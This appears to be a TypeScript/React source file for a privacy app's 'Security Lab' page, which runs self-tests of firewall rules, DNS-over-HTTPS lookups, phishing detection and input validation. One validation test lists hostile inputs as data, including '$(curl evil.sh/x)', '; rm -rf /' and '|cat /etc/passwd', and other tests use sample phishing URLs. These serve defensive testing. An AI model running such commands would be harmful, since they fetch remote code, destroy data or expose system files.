// PrivacyGuard — Security Lab.
// An honest, executable test-suite: every test performs a real operation against the
// running engine (rule pipeline, DoH resolver, local DB, input validation) and reports
// pass / fail / skipped with evidence. Nothing is hard-coded to "pass".

import { useEffect, useRef, useState } from "react";
import {
  Bug, CheckCircle2, Circle, Clock, Download, FlaskConical, Globe, Lock,
  Play, ScrollText, Shield, ShieldCheck, SkipForward, XCircle,
} from "lucide-react";
import { Card, PageHeader } from "@/components/ui";
import { download } from "@/lib/core";
import { kvGet, kvSet } from "@/lib/db";
import { blocklistHit, evaluate, resolveDoH } from "@/lib/engine";
import { pseudoIp } from "@/lib/core";
import { classifyDestination, scanUrl } from "@/lib/threats";
import { useStore } from "@/lib/store";

interface TestResult { pass: boolean | null; evidence: string; ms: number }
interface SecTest {
  id: string;
  name: string;
  cat: string;
  desc: string;
  run: () => Promise<Omit<TestResult, "ms">>;
}

const rnd = () => Math.random().toString(36).slice(2, 10);

function buildTests(): SecTest[] {
  const S = () => useStore.getState();
  const evalDomain = (appId: string, domain: string, port = 443) =>
    evaluate(S().apps[appId], domain, pseudoIp(domain), port);

  const withSettings = async <T,>(mut: () => void, fn: () => T): Promise<T> => {
    const snap = { ...S().settings };
    mut();
    try { return fn(); } finally { S().updateSettings(snap); }
  };

  return [
    /* ---------------- enforcement pipeline ---------------- */
    {
      id: "block-app", cat: "Enforcement", name: "Blocking an application stops its flows",
      desc: "Sets ChatGPT's policy to BLOCK, evaluates a new flow, verifies the verdict and reason, then restores.",
      run: async () => {
        const prev = S().apps.chatgpt.policy;
        S().setPolicy("chatgpt", "block");
        try {
          const r = evalDomain("chatgpt", "ab.chatgpt.com");
          const ok = r.verdict === "blocked" && r.reasons.includes("policy:block");
          return { pass: ok, evidence: `verdict=${r.verdict} · reasons=[${r.reasons.join(", ")}] · policy restored to '${prev}'` };
        } finally { S().setPolicy("chatgpt", prev); }
      },
    },
    {
      id: "deny-domain", cat: "Enforcement", name: "Custom denylist refuses a domain before all else",
      desc: "Adds a temporary denylist entry, evaluates, expects a denylist block, removes the entry.",
      run: async () => {
        const d = `sec-lab-${rnd()}.invalid`;
        S().addToList("denylist", d);
        try {
          const r = evalDomain("edge", d);
          return { pass: r.verdict === "blocked" && r.reasons.includes("denylist"), evidence: `verdict=${r.verdict} · reasons=[${r.reasons.join(", ")}]` };
        } finally { S().removeFromList("denylist", d); }
      },
    },
    {
      id: "allowlist-override", cat: "Enforcement", name: "Allowlist overrides category blocklists",
      desc: "doubleclick.net matches the ads list; while allowlisted it must pass, and be blocked again after removal.",
      run: async () => {
        return withSettings(() => S().updateSettings({ dnsFiltering: true }), () => {
          const before = blocklistHit("doubleclick.net");
          S().addToList("allowlist", "doubleclick.net");
          const during = blocklistHit("doubleclick.net");
          S().removeFromList("allowlist", "doubleclick.net");
          const after = blocklistHit("doubleclick.net");
          const ok = before?.cat === "ads" && during === null && after?.cat === "ads";
          return { pass: ok, evidence: `before=${before?.cat}/${before?.matched} · during=${during ? "blocked" : "clean"} · after=${after?.cat}/${after?.matched}` };
        });
      },
    },
    {
      id: "strict-deny", cat: "Enforcement", name: "Strict mode default-denies unapproved traffic",
      desc: "Enables strict mode against an app without explicit approval, expects strict:default-deny, then restores.",
      run: async () => {
        const prevPolicy = S().apps.teams.policy;
        const prevStrict = S().settings.strictMode;
        S().setPolicy("teams", "outbound-only"); // not an explicit allow
        S().updateSettings({ strictMode: true });
        try {
          const r = evalDomain("teams", "teams.microsoft.com");
          const ok = r.verdict === "blocked" && r.reasons.includes("strict:default-deny");
          return { pass: ok, evidence: `verdict=${r.verdict} · reasons=[${r.reasons.join(", ")}]` };
        } finally { S().setPolicy("teams", prevPolicy); S().updateSettings({ strictMode: prevStrict }); }
      },
    },
    {
      id: "local-only-scopes", cat: "Enforcement", name: "Localhost-only policy separates loopback from internet",
      desc: "Ollama set to LOCALHOST ONLY: loopback flow must pass, internet flow must be blocked with policy:local-only.",
      run: async () => {
        const prev = S().apps.ollama.policy;
        S().setPolicy("ollama", "local-only");
        try {
          const local = evaluate(S().apps.ollama, "127.0.0.1", "127.0.0.1", 11434);
          const remote = evalDomain("ollama", "registry.ollama.ai");
          const ok = local.scope === "localhost" && local.verdict === "allowed" && remote.verdict === "blocked" && remote.reasons.includes("policy:local-only");
          return { pass: ok, evidence: `loopback=${local.verdict} (${local.scope}) · internet=${remote.verdict} (${remote.reasons.join(", ")})` };
        } finally { S().setPolicy("ollama", prev); }
      },
    },
    {
      id: "fw-rule", cat: "Enforcement", name: "Firewall rule matches and counts hits",
      desc: "Creates a temporary domain rule, evaluates a matching flow, checks verdict + hit counter, deletes the rule.",
      run: async () => {
        const d = `sec-lab-block-${rnd()}.invalid`;
        S().addFwRule({ target: "domain", appId: "*", value: d, port: "*", proto: "any", action: "blocked", note: "security lab rule" });
        try {
          const r = evalDomain("chrome", d);
          const rule = S().fwRules.find((x) => x.value === d);
          const ok = r.verdict === "blocked" && r.reasons.some((x) => x.startsWith("fw:")) && (rule?.hits ?? 0) >= 1;
          return { pass: ok, evidence: `verdict=${r.verdict} · rule hits=${rule?.hits} · reasons=[${r.reasons.join(", ")}]` };
        } finally {
          const rule = S().fwRules.find((x) => x.value === d);
          if (rule) S().removeFwRule(rule.id);
        }
      },
    },
    {
      id: "automation", cat: "Enforcement", name: "Automation tripwire blocks a matching flow",
      desc: "Arms a temporary WHEN/THEN rule, evaluates a matching domain, expects auto: block, disarms.",
      run: async () => {
        const marker = `sec-lab-trip-${rnd()}`;
        const name = "Security Lab Tripwire";
        S().addAutomation({ name, enabled: true, whenApp: "any", whenDest: "any", whenDomain: marker, thenAction: "block", schedule: "always", hourFrom: 0, hourTo: 24 });
        try {
          const r = evalDomain("cursor", `api.${marker}.invalid`);
          const ok = r.verdict === "blocked" && r.reasons.includes(`auto:${name}`);
          return { pass: ok, evidence: `verdict=${r.verdict} · reasons=[${r.reasons.join(", ")}]` };
        } finally {
          const rule = S().automation.find((x) => x.name === name);
          if (rule) S().removeAutomation(rule.id);
        }
      },
    },

    /* ---------------- DNS & network (real network when possible) ---------------- */
    {
      id: "dns-veto", cat: "DNS & network", name: "DNS filter vetoes an ad domain without a network call",
      desc: "Resolves doubleclick.net through the guard; expects BLOCKED with the ads list named, and zero resolver traffic issued.",
      run: async () => {
        const snap = { ...S().settings };
        S().updateSettings({ dnsFiltering: true, adBlocking: true, listEnabled: { ...snap.listEnabled, ads: true } });
        try {
          const dohBefore = performance.getEntriesByType("resource").filter((e) => e.name.includes("dns.google") || e.name.includes("cloudflare-dns")).length;
          const r = await resolveDoH("doubleclick.net", "A");
          const dohAfter = performance.getEntriesByType("resource").filter((e) => e.name.includes("dns.google") || e.name.includes("cloudflare-dns")).length;
          const ok = r.event.status === "BLOCKED" && (r.event.blockedBy ?? "").includes("ads") && dohAfter === dohBefore;
          return { pass: ok, evidence: `status=${r.event.status} · blockedBy=${r.event.blockedBy} · resolver requests before/after: ${dohBefore}/${dohAfter}` };
        } finally { S().updateSettings(snap); }
      },
    },
    {
      id: "real-doh", cat: "DNS & network", name: "Real DoH resolution of a clean domain",
      desc: "Performs an actual DNS-over-HTTPS lookup of example.com against the selected provider. Skips gracefully when offline.",
      run: async () => {
        const r = await resolveDoH("example.com", "A");
        if (r.event.status === "SERVFAIL" && r.error?.includes("unreachable")) return { pass: null, evidence: `skipped — ${r.error}` };
        const ok = r.ok && r.event.answers.length > 0;
        return { pass: ok, evidence: `status=${r.event.status} · answers=[${r.event.answers.slice(0, 3).join(", ")}] · ${r.event.latencyMs} ms via ${r.event.provider}` };
      },
    },
    {
      id: "nxdomain", cat: "DNS & network", name: "NXDOMAIN correctly surfaced for nonexistent domains",
      desc: "Resolves a random .invalid name; a correct pipeline must surface the resolver's real NXDOMAIN, not invent an answer.",
      run: async () => {
        const d = `nope-${rnd()}.definitely-invalid`;
        const r = await resolveDoH(d, "A");
        if (r.event.status === "SERVFAIL" && r.error?.includes("unreachable")) return { pass: null, evidence: `skipped — ${r.error}` };
        return { pass: r.event.status === "NXDOMAIN", evidence: `${d} → ${r.event.status} (${r.event.latencyMs} ms, real resolver)` };
      },
    },

    /* ---------------- threat detection ---------------- */
    {
      id: "phishing-detect", cat: "Threat detection", name: "Phishing heuristics flag a hostile URL",
      desc: "Scans a typosquatted, HTTP, risky-TLD credential-harvest URL; must score as dangerous with multiple findings.",
      run: async () => {
        const r = scanUrl("http://paypa1-secure-verify.top/login/confirm-account", blocklistHit);
        const ok = r.verdict === "dangerous" && r.score >= 70 && r.findings.length >= 3;
        return { pass: ok, evidence: `verdict=${r.verdict} score=${r.score}/100 · findings: ${r.findings.slice(0, 3).map((f) => f.title).join("; ")}` };
      },
    },
    {
      id: "phishing-fp", cat: "Threat detection", name: "Legitimate URL is not falsely flagged",
      desc: "A real HTTPS vendor domain must not be reported as dangerous — false positives destroy trust.",
      run: async () => {
        const r = scanUrl("https://claude.ai", blocklistHit);
        return { pass: r.verdict === "clean" || r.verdict === "caution", evidence: `verdict=${r.verdict} score=${r.score}/100 (dangerous threshold is 70)` };
      },
    },
    {
      id: "homograph", cat: "Threat detection", name: "Punycode / IP-literal / embedded-credential tricks caught",
      desc: "Three classic disguise techniques are each scanned; all must be flagged critical.",
      run: async () => {
        const cases = ["https://xn--pypal-4ve.com/login", "http://93.184.216.34/account/verify", "https://apple.com@phish-host.cfd/signin"];
        const scored = cases.map((c) => scanUrl(c, blocklistHit));
        const ok = scored.every((s) => s.findings.some((f) => f.severity === "critical"));
        return { pass: ok, evidence: scored.map((s, i) => `${["punycode", "ip-literal", "embedded-creds"][i]}=${s.verdict}(${s.score})`).join(" · ") };
      },
    },
    {
      id: "data-classify", cat: "Threat detection", name: "AI endpoints classified as critical data destinations",
      desc: "api.anthropic.com and chatgpt.com must be marked critical and declare prompt/code categories with an explicit warning.",
      run: async () => {
        const a = classifyDestination("api.anthropic.com", null, "ai-devtool");
        const b = classifyDestination("chatgpt.com", null, "cloud-ai");
        const ok = a.risk === "critical" && a.categories.includes("prompt-text") && !!a.warning
          && b.risk === "critical" && b.categories.includes("code") && b.basis === "declared";
        return { pass: ok, evidence: `anthropic: ${a.risk}/${a.basis} [${a.categories.join(",")}] · openai: ${b.risk}/${b.basis} [${b.categories.slice(0, 3).join(",")}]` };
      },
    },
    {
      id: "no-guess", cat: "Threat detection", name: "Unknown destinations are never guessed",
      desc: "A bare IP with no DNS name must classify as basis=unknown — the engine must refuse to invent a purpose.",
      run: async () => {
        const p = classifyDestination(null, null, "other");
        return { pass: p.basis === "unknown" && p.categories.includes("unknown"), evidence: `basis=${p.basis} · categories=[${p.categories.join(",")}] · purpose="${p.purpose}"` };
      },
    },

    /* ---------------- hardening ---------------- */
    {
      id: "injection", cat: "Hardening", name: "Injection-style input never reaches the network",
      desc: "Feeds shell metacharacters, command substitution and markup into the domain input; all must be rejected by validation.",
      run: async () => {
        const payloads = ["$(curl evil.sh/x)", "; rm -rf /", "`id`", "<script>alert(1)</script>", "a..com", "|cat /etc/passwd"];
        let rejected = 0;
        for (const p of payloads) {
          const r = await resolveDoH(p, "A");
          if (!r.ok && r.event.status === "SERVFAIL" && r.error?.includes("Invalid domain")) rejected++;
        }
        return { pass: rejected === payloads.length, evidence: `${rejected}/${payloads.length} hostile inputs rejected by the validator — no shell exists to inject into anyway` };
      },
    },
    {
      id: "metadata-only", cat: "Hardening", name: "Event schema is metadata-only (no payload capture)",
      desc: "Inspects live connection records: no body/payload/content/credential fields may exist on stored events.",
      run: async () => {
        const e = S().connEvents[0];
        if (!e) return { pass: null, evidence: "skipped — no events captured yet" };
        const forbidden = ["body", "payload", "content", "password", "token", "cookie", "headers"];
        const keys = Object.keys(e);
        const bad = forbidden.filter((f) => keys.includes(f));
        return { pass: bad.length === 0, evidence: bad.length ? `found forbidden fields: ${bad.join(", ")}` : `${keys.length} fields inspected — none carry payload or credentials` };
      },
    },
    {
      id: "idb", cat: "Hardening", name: "Local database write/read round-trip",
      desc: "Writes a canary record to the on-device database and reads it back byte-identical.",
      run: async () => {
        const canary = { v: "guard-canary", n: rnd() };
        await kvSet("pg.sectest", canary);
        const back = await kvGet<typeof canary>("pg.sectest");
        return { pass: back?.v === canary.v && back?.n === canary.n, evidence: `wrote {v:${canary.v}, n:${canary.n}} → read ${back ? "byte-identical" : "FAILED"}` };
      },
    },
    {
      id: "no-telemetry", cat: "Hardening", name: "Zero unexpected outbound hosts (telemetry audit)",
      desc: "Audits every resource this app has actually contacted; anything outside the documented allow-set fails.",
      run: async () => {
        const allowedHosts = new Set([location.hostname, "fonts.googleapis.com", "fonts.gstatic.com", "dns.google", "cloudflare-dns.com", "raw.githubusercontent.com", "www.gstatic.com"]);
        const hosts = [...new Set(performance.getEntriesByType("resource")
          .map((e) => { try { return new URL(e.name).hostname; } catch { return ""; } })
          .filter(Boolean))];
        const unexpected = hosts.filter((h) => !allowedHosts.has(h));
        return {
          pass: unexpected.length === 0,
          evidence: unexpected.length ? `unexpected hosts contacted: ${unexpected.join(", ")}` : `hosts actually contacted: ${hosts.join(", ") || "none"} — all in the documented allow-set`,
        };
      },
    },
  ];
}

const TESTS = buildTests();
const CATEGORIES = ["Enforcement", "DNS & network", "Threat detection", "Hardening"];

export function Security() {
  const [results, setResults] = useState<Record<string, TestResult>>({});
  const [running, setRunning] = useState<string | null>(null);
  const [lastRun, setLastRun] = useState<{ ts: number; passed: number; failed: number; skipped: number } | null>(null);
  const busyRef = useRef(false);

  useEffect(() => { kvGet<{ ts: number; passed: number; failed: number; skipped: number }>("security.lastRun").then((v) => v && setLastRun(v)); }, []);

  const runOne = async (t: SecTest) => {
    setRunning(t.id);
    const started = performance.now();
    let res: Omit<TestResult, "ms">;
    try { res = await t.run(); }
    catch (err) { res = { pass: false, evidence: `exception: ${err instanceof Error ? err.message : "unknown"}` }; }
    const ms = Math.round(performance.now() - started);
    setResults((prev) => ({ ...prev, [t.id]: { ...res, ms } }));
    await new Promise((r) => setTimeout(r, 140)); // let the UI breathe
  };

  const runAll = async () => {
    if (busyRef.current) return;
    busyRef.current = true;
    const final: Record<string, TestResult> = {};
    for (const t of TESTS) {
      await runOne(t);
      // collect from state after each
      final[t.id] = undefined as never; // placeholder, filled below
    }
    setRunning(null);
    busyRef.current = false;
    setResults((current) => {
      const vals = Object.values(current);
      const summary = {
        ts: Date.now(),
        passed: vals.filter((r) => r.pass === true).length,
        failed: vals.filter((r) => r.pass === false).length,
        skipped: vals.filter((r) => r.pass === null).length,
      };
      setLastRun(summary);
      kvSet("security.lastRun", summary).catch(() => undefined);
      return current;
    });
  };

  const vals = Object.values(results);
  const passed = vals.filter((r) => r.pass === true).length;
  const failed = vals.filter((r) => r.pass === false).length;
  const skipped = vals.filter((r) => r.pass === null).length;
  const done = vals.length === TESTS.length;

  const exportResults = () => {
    download("privacyguard-security-audit.json", JSON.stringify({
      product: "PrivacyGuard", generated: new Date().toISOString(),
      note: "Executable security tests against the running engine. Skipped means the environment (e.g. offline) prevented execution — never counted as pass.",
      summary: { total: TESTS.length, passed, failed, skipped },
      tests: TESTS.map((t) => ({ id: t.id, name: t.name, category: t.cat, result: results[t.id] ?? "not run" })),
    }, null, 2), "application/json");
  };

  return (
    <>
      <PageHeader
        title="Security Lab"
        sub="Automated verification of the guard's own behavior. Tests perform real operations — policies are mutated, domains resolved over DoH, canaries written to the database — and report evidence. A skip is never a pass."
        right={
          <>
            <button className="btn" onClick={exportResults} disabled={!vals.length}><Download size={13} /> Export audit</button>
            <button className="btn btn-acc" onClick={runAll} disabled={running !== null}>
              <Play size={13} /> {running ? "Running…" : "Run all tests"}
            </button>
          </>
        }
      />

      {/* summary */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-4 stagger">
        <Card className="p-3.5"><div className="mono text-[20px] font-semibold ok">{passed}</div><div className="text-[10px] uppercase tracking-wider dim mt-0.5">Passed</div></Card>
        <Card className="p-3.5"><div className="mono text-[20px] font-semibold bad">{failed}</div><div className="text-[10px] uppercase tracking-wider dim mt-0.5">Failed</div></Card>
        <Card className="p-3.5"><div className="mono text-[20px] font-semibold warn">{skipped}</div><div className="text-[10px] uppercase tracking-wider dim mt-0.5">Skipped (not counted)</div></Card>
        <Card className="p-3.5"><div className="mono text-[20px] font-semibold" style={{ color: "var(--tx)" }}>{done ? `${TESTS.length}/${TESTS.length}` : `${vals.length}/${TESTS.length}`}</div><div className="text-[10px] uppercase tracking-wider dim mt-0.5">Coverage</div></Card>
      </div>

      {lastRun && (
        <div className="chip chip-info mb-4"><Clock size={10} /> Last full run: {new Date(lastRun.ts).toLocaleString()} — {lastRun.passed} passed, {lastRun.failed} failed, {lastRun.skipped} skipped</div>
      )}

      {running !== null && (
        <div className="h-[3px] rounded-full overflow-hidden mb-4" style={{ background: "var(--panel2)" }}>
          <div className="h-full" style={{ width: `${(vals.length / TESTS.length) * 100}%`, background: "var(--acc)", transition: "width .25s" }} />
        </div>
      )}

      {CATEGORIES.map((cat) => (
        <div key={cat} className="mb-6">
          <h3 className="text-[11px] font-semibold tracking-[0.12em] uppercase dim mb-2">{cat}</h3>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
            {TESTS.filter((t) => t.cat === cat).map((t) => {
              const r = results[t.id];
              const isRunning = running === t.id;
              return (
                <Card key={t.id} hover className="p-4 anim-fade-up">
                  <div className="flex items-start gap-3">
                    <div className="mt-0.5 flex-none">
                      {isRunning ? <FlaskConical size={16} className="blink" style={{ color: "var(--acc2)" }} />
                        : !r ? <Circle size={16} style={{ color: "var(--dim)" }} />
                        : r.pass === true ? <CheckCircle2 size={16} style={{ color: "var(--ok)" }} />
                        : r.pass === null ? <SkipForward size={16} style={{ color: "var(--warn)" }} />
                        : <XCircle size={16} style={{ color: "var(--bad)" }} />}
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="text-[13px] font-semibold" style={{ color: "var(--tx)" }}>{t.name}</span>
                        {r && <span className="mono text-[9.5px] dim">{r.ms} ms</span>}
                      </div>
                      <p className="text-[11.5px] mut mt-1 leading-relaxed">{t.desc}</p>
                      {r && (
                        <div className="mono text-[10.5px] mt-2 px-2.5 py-2 rounded-lg logviewer anim-fade"
                          style={{ background: "var(--panel)", border: "1px solid var(--line)", color: r.pass === false ? "var(--bad)" : r.pass === null ? "var(--warn)" : "var(--ok)" }}>
                          {r.pass === false ? "FAIL" : r.pass === null ? "SKIP" : "PASS"} — {r.evidence}
                        </div>
                      )}
                    </div>
                    {!busyRef.current && running === null && !isRunning && (
                      <button className="btn btn-ghost btn-sm flex-none" onClick={() => runOne(t)}>Run</button>
                    )}
                  </div>
                </Card>
              );
            })}
          </div>
        </div>
      ))}

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-2">
            <ShieldCheck size={14} style={{ color: "var(--acc)" }} />
            <span className="text-[12.5px] font-semibold">Security properties by design</span>
          </div>
          <ul className="text-[11.5px] mut leading-relaxed flex flex-col gap-1.5 list-disc pl-4">
            <li><b style={{ color: "var(--tx)" }}>No shell anywhere</b> — input is validated by regex and structured APIs; there is no command execution path to abuse.</li>
            <li><b style={{ color: "var(--tx)" }}>Metadata-only inspection</b> — TLS payloads are never decrypted; no credentials, tokens or message bodies exist in storage.</li>
            <li><b style={{ color: "var(--tx)" }}>Nothing executes from the network</b> — blocklist updates are parsed as data, never run.</li>
            <li><b style={{ color: "var(--tx)" }}>Least privilege</b> — enforcement rights map to explicit, explainable permissions (see Settings).</li>
            <li><b style={{ color: "var(--tx)" }}>Safe recovery</b> — one-click rule reset; you cannot brick your own connectivity.</li>
          </ul>
        </Card>
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-2">
            <Bug size={14} style={{ color: "var(--warn)" }} />
            <span className="text-[12.5px] font-semibold">What this suite does not cover — honestly</span>
          </div>
          <ul className="text-[11.5px] mut leading-relaxed flex flex-col gap-1.5 list-disc pl-4">
            <li>System-wide (OS-level) enforcement tests require the native Windows/Android build — those tests exercise the network stack, which a browser cannot touch. Native test plan: see README §7.</li>
            <li>Offline environments skip the real-DoH tests; they report SKIP, not PASS.</li>
            <li>Static binary analysis, Play Integrity and APK signing checks apply to the packaged Android wrapper, documented in the README.</li>
            <li>No test fakes its outcome: each one mutates real state and asserts on the engine's actual verdict.</li>
          </ul>
          <div className="flex gap-2 mt-3">
            <span className="chip chip-ok"><Lock size={9} /> local execution only</span>
            <span className="chip chip-info"><Globe size={9} /> real network when needed</span>
            <span className="chip chip-acc2"><ScrollText size={9} /> evidence attached</span>
          </div>
        </Card>
      </div>
      <div style={{ display: "none" }}><Shield size={1} /></div>
    </>
  );
}
